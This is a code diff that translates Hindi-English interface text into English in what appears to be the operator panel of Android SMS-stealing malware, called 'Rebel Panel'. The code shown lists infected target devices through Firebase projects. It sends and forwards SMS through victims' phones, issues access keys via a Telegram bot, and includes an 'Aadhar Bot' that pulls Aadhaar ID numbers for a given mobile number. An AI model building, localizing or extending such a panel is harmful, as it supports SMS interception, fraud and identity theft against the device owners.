@@ -535,7 +535,7 @@ header('Content-Type: text/html; charset=UTF-8');
         <div><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">SECURE ACCESS GATE</div></div>
       </div>
       <h2>Access <span>Key</span></h2>
-      <p class="login-sub">Username / password disabled. Telegram bot se <strong>one-time Rebel Key</strong> lo — har key sirf <strong>ek baar</strong> use hogi.</p>
+      <p class="login-sub">Username / password disabled. Get a <strong>one-time Rebel Key</strong> from the Telegram bot — each key works <strong>only once</strong>.</p>
       <div id="loginError" class="login-error">❌ Invalid or expired access key!</div>
       <div class="key-field-wrap">
         <label>Rebel Access Key</label>
@@ -552,7 +552,7 @@ header('Content-Type: text/html; charset=UTF-8');
       </div>
       <div class="remember-row"><input type="checkbox" id="rememberMe" checked/><label for="rememberMe">Remember this device (30 days)</label></div>
       <button class="btn btn-login-advanced" id="loginBtn" onclick="doLogin()"><span class="btn-shine"></span><span class="i3d i3d-purple i3d-sm i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Unlock Panel</button>
-      <div class="login-hint">Key chahiye? Telegram bot par owner se <strong>/genkey</strong> bhejo.<br>Format: <code>RBL-XXXXXX-XXXXXX</code></div>
+      <div class="login-hint">Need a key? Ask the owner to run <strong>/genkey</strong> on the Telegram bot.<br>Format: <code>RBL-XXXXXX-XXXXXX</code></div>
       <div class="login-status"><span class="login-status-dot"></span> Auth server ready</div>
     </div>
   </div>
@@ -690,7 +690,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <!-- SEND SMS -->
       <div class="data-section" id="tab-sendsms">
         <div class="sec-title" style="margin-bottom:4px">Send <span>SMS</span></div>
-        <div class="api-key-warn" id="sendSmsApiWarn">⚠️ <strong>API Key is necessary</strong> for SMS sending. Rebel AI wizard mein API Key add karo — bina iske command device tak nahi jayega.</div>
+        <div class="api-key-warn" id="sendSmsApiWarn">⚠️ <strong>API Key is required</strong> for SMS sending. Add it in the Rebel AI wizard — without it, commands will not reach the device.</div>
         <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
         <div class="config-card">
           <div class="input-group">
@@ -708,7 +708,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <!-- FORWARDING -->
       <div class="data-section" id="tab-forward">
         <div class="sec-title" style="margin-bottom:8px">SMS <span>Forwarding</span></div>
-        <div class="api-key-warn" id="forwardApiWarn">⚠️ <strong>API Key is necessary</strong> for SMS forwarding. Firebase connect karte waqt API Key zaroor add karo.</div>
+        <div class="api-key-warn" id="forwardApiWarn">⚠️ <strong>API Key is required</strong> for SMS forwarding. Make sure to add the API Key when connecting Firebase.</div>
         <div class="config-card">
           <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
             <label style="margin:0;font-size:11px;color:var(--text)">Enable Forwarding</label>
@@ -755,7 +755,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="modal-box modal-wide" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('firebaseModal').classList.add('hidden')">✕</button>
     <div class="sec-title" style="margin-bottom:12px"><span class="i3d i3d-fire i3d-anim i3d-anim-fire"><span class="em-a">🔥</span></span> Firebase <span>Manager</span></div>
-    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Use <strong>Chat with Rebel AI</strong> — step-by-step wizard URL, API key aur saari config mangta hai. URL hidden rehta hai.</p>
+    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Use <strong>Chat with Rebel AI</strong> — a step-by-step wizard asks for URL, API key, and full config. The URL stays hidden.</p>
     <div class="fb-list" id="fbList"></div>
     <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px">
       <button class="btn-sm" onclick="openRebelAiModal();closeFirebaseModalQuick()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-robot"><span class="em-a">🤖</span></span> Chat with Rebel AI</button>
@@ -769,7 +769,7 @@ header('Content-Type: text/html; charset=UTF-8');
   <div class="modal-box modal-wide" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('aadharModal').classList.add('hidden')">✕</button>
     <div class="sec-title" style="margin-bottom:8px"><span class="i3d i3d-green i3d-anim i3d-anim-pulse"><span class="em-a">🪪</span></span> Aadhar <span>Bot</span></div>
-    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Mobile number dalo — API response se sirf <strong>aadhar</strong> field fetch hogi.</p>
+    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Enter a mobile number — only the <strong>aadhar</strong> field will be fetched from the API response.</p>
     <div class="config-card" style="max-width:100%">
       <div class="input-group">
         <div><label><span class="i3d i3d-blue i3d-sm">📱</span> Mobile Number</label><input type="tel" id="aadharNum" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/></div>
@@ -832,15 +832,15 @@ var rebelWizardStep=0;
 var rebelWizardDraft={};
 var REBEL_WIZARD_STEPS=[
   {key:'databaseURL',label:'Firebase URL',required:true,placeholder:'https://your-project-default-rtdb.firebaseio.com',
-   prompt:'Namaste! Main <strong>Rebel AI</strong> hoon.<br><br>Pehle apna <strong>Firebase URL</strong> (Realtime Database) bhejo.<br>Example: <code>https://xxx-default-rtdb.firebaseio.com</code><br><br>Poora config paste karoge to baaki fields auto-fill ho jayengi.'},
+   prompt:'Hello! I am <strong>Rebel AI</strong>.<br><br>First, send your <strong>Firebase URL</strong> (Realtime Database).<br>Example: <code>https://xxx-default-rtdb.firebaseio.com</code><br><br>Paste full config and remaining fields will auto-fill.'},
   {key:'apiKey',label:'API Key',required:false,placeholder:'AIzaSy...',
-   prompt:'Ab <strong>API Key</strong> bhejo (Firebase Console → Project settings → Your apps).<br><br><span style="color:var(--accent2)">⚠️ Warning:</span> <strong>API Key is necessary for SMS sending and forwarding.</strong> Bina API Key ke sirf data read hoga — Send SMS aur Forwarding kaam nahi karenge.<br><br>Type <code>skip</code> sirf tab jab sirf devices dekhne hon.'},
+   prompt:'Now send your <strong>API Key</strong> (Firebase Console → Project settings → Your apps).<br><br><span style="color:var(--accent2)">⚠️ Warning:</span> <strong>API Key is required for SMS sending and forwarding.</strong> Without it, only read access works — Send SMS and Forwarding will not work.<br><br>Type <code>skip</code> only if you just want to view devices.'},
   {key:'name',label:'Project Name',required:false,placeholder:'My Firebase Project',
-   prompt:'<strong>Project Name</strong> bhejo — panel mein yahi naam dikhega.<br>Type <code>skip</code> — URL se auto naam lag jayega.'},
+   prompt:'Send <strong>Project Name</strong> — this is the name shown in the panel.<br>Type <code>skip</code> — name will be auto-detected from URL.'},
   {key:'storageBucket',label:'Storage Bucket',required:false,placeholder:'your-project.firebasestorage.app',
-   prompt:'<strong>Storage Bucket</strong> bhejo.<br>Example: <code>spinplay99.firebasestorage.app</code><br>Type <code>skip</code> agar nahi hai.'},
+   prompt:'Send <strong>Storage Bucket</strong>.<br>Example: <code>spinplay99.firebasestorage.app</code><br>Type <code>skip</code> if not available.'},
   {key:'appId',label:'App ID',required:false,placeholder:'1:123456789:web:abcdef...',
-   prompt:'Last step — <strong>App ID</strong> bhejo. Iske baad main connect kar dunga.<br>Example: <code>1:8121733414:web:04b9ae5df1b6bc413e31e7</code><br>Type <code>skip</code> agar optional hai.'}
+   prompt:'Last step — send <strong>App ID</strong>. I will connect after this.<br>Example: <code>1:8121733414:web:04b9ae5df1b6bc413e31e7</code><br>Type <code>skip</code> if optional.'}
 ];
 var PROTECTED_FB_IDS=['spinplay99','rabel_raand','pmfg_ccccc','monster_green_c5e81','nsx1_7f7aa'];
 var DEFAULT_FIREBASES=[{
@@ -1756,7 +1756,7 @@ function renderSidebar(){
     if(inst&&inst.connError){
       errMsg='<br><span style="color:var(--error);margin-top:8px;display:block;font-size:9px">⚠ '+esc(inst.connError)+'</span>';
       if(/deactivated|suspended/i.test(inst.connError)){
-        errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK mein purana cached data dikh sakta hai. Firebase Console se database enable karo.</span>';
+        errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK may show old cached data. Enable the database in Firebase Console.</span>';
       }
     }
     el.innerHTML='<div class="dev-empty">'+icoAnim('satellite','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span>'+errMsg+'</div>';
@@ -2367,7 +2367,7 @@ function parseAadharApiResponse(r){
   return r.text().then(function(txt){
     var t=String(txt||'').trim();
     if(!t) throw new Error('Empty API response');
-    if(aadharIsPhpHtml(t)) throw new Error('PHP proxy nahi chal raha - sex.php ko PHP server par host karo');
+    if(aadharIsPhpHtml(t)) throw new Error('PHP proxy not running — host sex.php on a PHP server');
     var d=null;
     try{d=JSON.parse(t);}catch(e){throw new Error('Invalid JSON from server');}
     if(!r.ok) throw new Error((d&&d.error)||('HTTP '+r.status));
@@ -2411,7 +2411,7 @@ function lookupAadhar(){
   var st=document.getElementById('aadharStatus');
   var tb=document.getElementById('aadharTbody');
   if(!num||num.length<10){
-    st.innerHTML='<span style="color:var(--error)">Valid 10-digit mobile number dalo</span>';
+    st.innerHTML='<span style="color:var(--error)">Enter a valid 10-digit mobile number</span>';
     return;
   }
   st.innerHTML='<span style="color:var(--muted)">Looking up '+esc(num)+'...</span>';
@@ -2428,11 +2428,11 @@ function lookupAadhar(){
       aadhars.push(a);
     });
     if(!aadhars.length){
-      st.innerHTML='<span style="color:var(--error)">Is number ke liye aadhar field nahi mili</span>';
+      st.innerHTML='<span style="color:var(--error)">No aadhar field found for this number</span>';
       tb.innerHTML='<tr><td colspan="3" class="tbl-empty">No aadhar in API response</td></tr>';
       return;
     }
-    st.innerHTML='<span style="color:var(--success)">✅ '+aadhars.length+' unique aadhar mila</span>';
+    st.innerHTML='<span style="color:var(--success)">✅ '+aadhars.length+' unique aadhar found</span>';
     tb.innerHTML=aadhars.map(function(a,i){
       return '<tr><td>'+(i+1)+'</td><td class="mono">'+esc(num)+'</td><td><span class="aadhar-hl">'+esc(a)+'</span></td></tr>';
     }).join('');
@@ -2448,13 +2448,13 @@ function updateApiKeyWarnings(){
   var f=document.getElementById('forwardApiWarn');
   if(s){
     s.innerHTML=hasKey
-      ? '✅ API Key set — SMS sending available hai.'
-      : '⚠️ <strong>API Key is necessary</strong> for SMS sending. Rebel AI wizard mein API Key add karo — bina iske command device tak nahi jayega.';
+      ? '✅ API Key set — SMS sending is available.'
+      : '⚠️ <strong>API Key is required</strong> for SMS sending. Add it in the Rebel AI wizard — without it, commands will not reach the device.';
   }
   if(f){
     f.innerHTML=hasKey
-      ? '✅ API Key set — SMS forwarding available hai.'
-      : '⚠️ <strong>API Key is necessary</strong> for SMS forwarding. Rebel AI se API Key add karo.';
+      ? '✅ API Key set — SMS forwarding is available.'
+      : '⚠️ <strong>API Key is required</strong> for SMS forwarding. Add it via Rebel AI.';
   }
 }
 
@@ -2512,7 +2512,7 @@ function rebelWizardShowStep(){
   appendRebelMsg('ai','<span style="opacity:0.7">Step '+(rebelWizardStep+1)+'/'+REBEL_WIZARD_STEPS.length+'</span><br><br>'+step.prompt+skipBtn);
 }
 function rebelWizardApiKeyWarn(){
-  appendRebelMsg('sys','⚠️ <strong>Warning:</strong> API Key is necessary for <strong>SMS sending</strong> and <strong>SMS forwarding</strong>. Bina API Key ke ye features kaam nahi karenge.');
+  appendRebelMsg('sys','⚠️ <strong>Warning:</strong> API Key is required for <strong>SMS sending</strong> and <strong>SMS forwarding</strong>. These features will not work without an API Key.');
 }
 function startRebelWizard(resetChat){
   rebelWizardActive=true;
@@ -2537,12 +2537,12 @@ function rebelWizardValidateStep(step,val){
   if(!v&&!step.required) return {ok:true,value:''};
   if(step.key==='databaseURL'){
     var url=normalizeFirebaseUrl(v);
-    if(!url) return {ok:false,err:'Valid Firebase database URL chahiye. Example: https://xxx-default-rtdb.firebaseio.com'};
+    if(!url) return {ok:false,err:'Valid Firebase database URL required. Example: https://xxx-default-rtdb.firebaseio.com'};
     return {ok:true,value:url};
   }
   if(step.key==='apiKey'){
     if(!v||/^skip$/i.test(v)) return {ok:true,value:''};
-    if(!/^AIza[A-Za-z0-9_-]{20,}$/.test(v)) return {ok:false,err:'API Key AIza se start honi chahiye, ya type karo: skip'};
+    if(!/^AIza[A-Za-z0-9_-]{20,}$/.test(v)) return {ok:false,err:'API Key must start with AIza, or type: skip'};
     return {ok:true,value:v};
   }
   if(/^skip$/i.test(v)) return {ok:true,value:''};
@@ -2557,7 +2557,7 @@ function rebelWizardAdvance(val){
   if(!step) return rebelWizardFinish();
   var check=rebelWizardValidateStep(step,val);
   if(!check.ok){
-    appendRebelMsg('ai','⚠️ '+esc(check.err)+'<br><br>Dobara try karo ya <code>skip</code> likho (agar optional ho).');
+    appendRebelMsg('ai','⚠️ '+esc(check.err)+'<br><br>Try again or type <code>skip</code> (if optional).');
     return;
   }
   if(check.value) rebelWizardDraft[step.key]=check.value;
@@ -2589,7 +2589,7 @@ function rebelWizardFinish(){
     rebelAiLocalReply(res,null);
   }).catch(function(err){
     rebelAiLocalReply(null,err);
-    appendRebelMsg('ai','Setup dubara shuru karne ke liye type karo: <code>new</code>');
+    appendRebelMsg('ai','To restart setup, type: <code>new</code>');
   }).finally(function(){
     document.getElementById('rebelTyping').classList.add('hidden');
     var btn=document.getElementById('rebelSendBtn');
@@ -2606,7 +2606,7 @@ function handleRebelWizardInput(text){
     var filled=[];
     REBEL_WIZARD_STEPS.forEach(function(s){if(rebelWizardDraft[s.key]) filled.push(s.label);});
     if(filled.length>1){
-      appendRebelMsg('ai','✨ Config detect ho gaya! Auto-fill: <code>'+esc(filled.join(', '))+'</code>');
+      appendRebelMsg('ai','✨ Config detected! Auto-filled: <code>'+esc(filled.join(', '))+'</code>');
       while(rebelWizardStep<REBEL_WIZARD_STEPS.length){
         var st=REBEL_WIZARD_STEPS[rebelWizardStep];
         if(rebelWizardDraft[st.key]) rebelWizardStep++;
@@ -2818,7 +2818,7 @@ function sendRebelAiMessage(){
       input.focus();
     }).catch(function(err){
       rebelAiLocalReply(null,err);
-      appendRebelMsg('ai','Step-by-step setup ke liye type karo: <code>new</code>');
+      appendRebelMsg('ai','For step-by-step setup, type: <code>new</code>');
       btn.disabled=false;
       input.focus();
     });
@@ -2834,7 +2834,7 @@ function sendRebelAiMessage(){
     }
   }).catch(function(){
     document.getElementById('rebelTyping').classList.add('hidden');
-    appendRebelMsg('ai','Rebel AI abhi unavailable hai. Firebase add karne ke liye type karo: <code>new</code>');
+    appendRebelMsg('ai','Rebel AI is currently unavailable. To add Firebase, type: <code>new</code>');
   }).finally(function(){btn.disabled=false;input.focus();});
 }
 
